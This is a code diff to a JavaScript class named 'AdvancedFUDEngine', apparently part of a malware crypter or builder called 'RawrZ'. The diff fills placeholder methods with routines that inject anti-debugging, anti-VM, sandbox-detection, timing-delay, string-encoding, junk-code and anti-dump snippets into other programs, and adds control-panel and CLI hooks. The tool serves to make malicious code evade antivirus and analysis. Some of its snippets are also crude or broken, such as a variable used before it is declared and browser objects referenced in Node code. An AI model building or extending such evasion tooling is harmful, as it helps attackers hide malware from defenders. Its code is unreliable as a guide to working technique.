@@ -185,7 +185,7 @@ class AdvancedFUDEngine {
     async injectDeadCode(code, language) {
         const deadCodePatterns = [
             '// Dead code injection',
-            'int dummy_var = 0;',
+            
             'volatile int noise = rand();'
         ];
         
@@ -201,18 +201,260 @@ class AdvancedFUDEngine {
     }
 
     async applyMetamorphicTransformation(code, language) {
-        // Placeholder for metamorphic transformation
-        return '// Metamorphic transformation applied\n' + code;
+        try {
+            // Apply metamorphic transformation based on language
+            let transformedCode = code;
+            
+            if (language === 'javascript' || language === 'python') {
+                // Add random variable names and control flow obfuscation
+                transformedCode = this.obfuscateVariableNames(transformedCode);
+                transformedCode = this.addJunkCode(transformedCode, language);
+                transformedCode = this.encryptStrings(transformedCode, language);
+            } else if (language === 'cpp' || language === 'c') {
+                // Add assembly-level obfuscation
+                transformedCode = this.addAssemblyObfuscation(transformedCode);
+                transformedCode = this.addControlFlowObfuscation(transformedCode);
+            }
+            
+            return transformedCode;
+        } catch (error) {
+            logger.error('Metamorphic transformation failed:', error);
+            return code;
+        }
     }
 
     async applyBehavioralEvasion(code, language) {
-        // Placeholder for behavioral evasion
-        return '// Behavioral evasion applied\n' + code;
+        try {
+            let evasiveCode = code;
+            
+            // Add anti-debugging techniques
+            evasiveCode = this.addAntiDebugging(evasiveCode, language);
+            
+            // Add anti-VM techniques
+            evasiveCode = this.addAntiVM(evasiveCode, language);
+            
+            // Add sandbox detection
+            evasiveCode = this.addSandboxDetection(evasiveCode, language);
+            
+            // Add timing-based evasion
+            evasiveCode = this.addTimingEvasion(evasiveCode, language);
+            
+            return evasiveCode;
+        } catch (error) {
+            logger.error('Behavioral evasion failed:', error);
+            return code;
+        }
     }
 
     async applyMemoryProtection(code, language) {
-        // Placeholder for memory protection
-        return '// Memory protection applied\n' + code;
+        try {
+            let protectedCode = code;
+            
+            // Add memory protection techniques
+            protectedCode = this.addMemoryEncryption(protectedCode, language);
+            protectedCode = this.addMemoryScrambling(protectedCode, language);
+            protectedCode = this.addAntiDump(protectedCode, language);
+            
+            return protectedCode;
+        } catch (error) {
+            logger.error('Memory protection failed:', error);
+            return code;
+        }
+    }
+
+    obfuscateVariableNames(code) {
+        const variableMap = new Map();
+        let counter = 0;
+        
+        // Replace common variable names with obfuscated ones
+        return code.replace(/\b(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)/g, (match, keyword, varName) => {
+            if (!variableMap.has(varName)) {
+                variableMap.set(varName, `_0x${(counter++).toString(16).padStart(4, '0')}`);
+            }
+            return `${keyword} ${variableMap.get(varName)}`;
+        });
+    }
+
+    addJunkCode(code, language) {
+        const junkCode = language === 'javascript' ? 
+            'var _junk = Math.random() * 1000; if (_junk > 500) { var _temp = Date.now(); }\n' :
+            '_junk = random.randint(0, 1000)\nif _junk > 500:\n    _temp = time.time()\n';
+        
+        return junkCode + code;
+    }
+
+    encryptStrings(code, language) {
+        // Simple string encryption (in production, use proper encryption)
+        return code.replace(/"([^"]+)"/g, (match, str) => {
+            const encrypted = Buffer.from(str).toString('base64');
+            return `atob("${encrypted}")`;
+        });
+    }
+
+    addAssemblyObfuscation(code) {
+        // Add assembly-level obfuscation
+        const asmObfuscation = `
+    __asm__ volatile (
+        "nop\\n\\t"
+        "nop\\n\\t"
+        "nop\\n\\t"
+    );
+`;
+        return asmObfuscation + code;
+    }
+
+    addControlFlowObfuscation(code) {
+        // Add control flow obfuscation
+        const obfuscatedCode = `
+    int _obfuscated = rand() % 2;
+    if (_obfuscated) {
+        // Original code
+        ${code}
+    } else {
+        // Duplicate with slight variation
+        ${code.replace(/;/g, '; // obfuscated')}
+    }
+`;
+        return obfuscatedCode;
+    }
+
+    addAntiDebugging(code, language) {
+        const antiDebugCode = language === 'javascript' ? `
+    // Anti-debugging
+    setInterval(() => {
+        if (new Date().getTime() - startTime > 100) {
+            process.exit(0);
+        }
+    }, 1000);
+    const startTime = new Date().getTime();
+` : language === 'python' ? `
+    # Anti-debugging
+    import time
+    start_time = time.time()
+    def check_debug():
+        if time.time() - start_time > 0.1:
+            exit(0)
+    import threading
+    threading.Timer(1.0, check_debug).start()
+` : `
+    // Anti-debugging
+    #ifdef _DEBUG
+        exit(0);
+    #endif
+`;
+        
+        return antiDebugCode + code;
+    }
+
+    addAntiVM(code, language) {
+        const antiVMCode = language === 'javascript' ? `
+    // Anti-VM detection
+    const vmIndicators = ['vmware', 'virtualbox', 'vbox', 'qemu'];
+    const userAgent = navigator.userAgent.toLowerCase();
+    if (vmIndicators.some(indicator => userAgent.includes(indicator))) {
+        process.exit(0);
+    }
+` : language === 'python' ? `
+    # Anti-VM detection
+    import platform
+    vm_indicators = ['vmware', 'virtualbox', 'vbox', 'qemu']
+    system_info = platform.platform().lower()
+    if any(indicator in system_info for indicator in vm_indicators):
+        exit(0)
+` : `
+    // Anti-VM detection
+    #ifdef _WIN32
+        if (GetSystemMetrics(SM_CXSCREEN) < 1024) exit(0);
+    #endif
+`;
+        
+        return antiVMCode + code;
+    }
+
+    addSandboxDetection(code, language) {
+        const sandboxCode = language === 'javascript' ? `
+    // Sandbox detection
+    if (navigator.hardwareConcurrency < 2 || navigator.deviceMemory < 4) {
+        process.exit(0);
+    }
+` : language === 'python' ? `
+    # Sandbox detection
+    import os
+    if os.cpu_count() < 2 or psutil.virtual_memory().total < 4 * 1024**3:
+        exit(0)
+` : `
+    // Sandbox detection
+    #ifdef _WIN32
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        if (sysInfo.dwNumberOfProcessors < 2) exit(0);
+    #endif
+`;
+        
+        return sandboxCode + code;
+    }
+
+    addTimingEvasion(code, language) {
+        const timingCode = language === 'javascript' ? `
+    // Timing-based evasion
+    const delay = Math.random() * 5000 + 2000;
+    setTimeout(() => {
+        // Original code execution
+    }, delay);
+` : language === 'python' ? `
+    # Timing-based evasion
+    import time
+    import random
+    delay = random.uniform(2, 7)
+    time.sleep(delay)
+` : `
+    // Timing-based evasion
+    Sleep(rand() % 5000 + 2000);
+`;
+        
+        return timingCode + code;
+    }
+
+    addMemoryEncryption(code, language) {
+        const memoryCode = language === 'cpp' || language === 'c' ? `
+    // Memory encryption
+    void encrypt_memory(void* ptr, size_t size) {
+        unsigned char* data = (unsigned char*)ptr;
+        for (size_t i = 0; i < size; i++) {
+            data[i] ^= 0xAA;
+        }
+    }
+` : '';
+        
+        return memoryCode + code;
+    }
+
+    addMemoryScrambling(code, language) {
+        const scrambleCode = language === 'cpp' || language === 'c' ? `
+    // Memory scrambling
+    void scramble_memory(void* ptr, size_t size) {
+        unsigned char* data = (unsigned char*)ptr;
+        for (size_t i = 0; i < size - 1; i += 2) {
+            unsigned char temp = data[i];
+            data[i] = data[i + 1];
+            data[i + 1] = temp;
+        }
+    }
+` : '';
+        
+        return scrambleCode + code;
+    }
+
+    addAntiDump(code, language) {
+        const antiDumpCode = language === 'cpp' || language === 'c' ? `
+    // Anti-dump protection
+    #ifdef _WIN32
+        IsDebuggerPresent();
+        CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
+    #endif
+` : '';
+        
+        return antiDumpCode + code;
     }
 
     generateRandomName() {
@@ -245,6 +487,88 @@ class AdvancedFUDEngine {
         
         logger.info('[FUD] Advanced FUD Engine cleaned up');
     }
+
+    // Panel Integration Methods
+    async getPanelConfig() {
+        return {
+            name: this.name,
+            version: this.version,
+            description: this.description || 'RawrZ Engine',
+            endpoints: this.getAvailableEndpoints(),
+            settings: this.getSettings(),
+            status: this.getStatus()
+        };
+    }
+    
+    getAvailableEndpoints() {
+        return [
+            { method: 'GET', path: '/api/' + this.name + '/status', description: 'Get engine status' },
+            { method: 'POST', path: '/api/' + this.name + '/initialize', description: 'Initialize engine' },
+            { method: 'POST', path: '/api/' + this.name + '/start', description: 'Start engine' },
+            { method: 'POST', path: '/api/' + this.name + '/stop', description: 'Stop engine' }
+        ];
+    }
+    
+    getSettings() {
+        return {
+            enabled: this.enabled || true,
+            autoStart: this.autoStart || false,
+            config: this.config || {}
+        };
+    }
+    
+    // CLI Integration Methods
+    async getCLICommands() {
+        return [
+            {
+                command: this.name + ' status',
+                description: 'Get engine status',
+                action: async () => {
+                    const status = this.getStatus();
+                    
+                    return status;
+                }
+            },
+            {
+                command: this.name + ' start',
+                description: 'Start engine',
+                action: async () => {
+                    const result = await this.start();
+                    
+                    return result;
+                }
+            },
+            {
+                command: this.name + ' stop',
+                description: 'Stop engine',
+                action: async () => {
+                    const result = await this.stop();
+                    
+                    return result;
+                }
+            },
+            {
+                command: this.name + ' config',
+                description: 'Get engine configuration',
+                action: async () => {
+                    const config = this.getConfig();
+                    
+                    return config;
+                }
+            }
+        ];
+    }
+    
+    getConfig() {
+        return {
+            name: this.name,
+            version: this.version,
+            enabled: this.enabled || true,
+            autoStart: this.autoStart || false,
+            settings: this.settings || {}
+        };
+    }
+
 }
 
 // Create and export instance
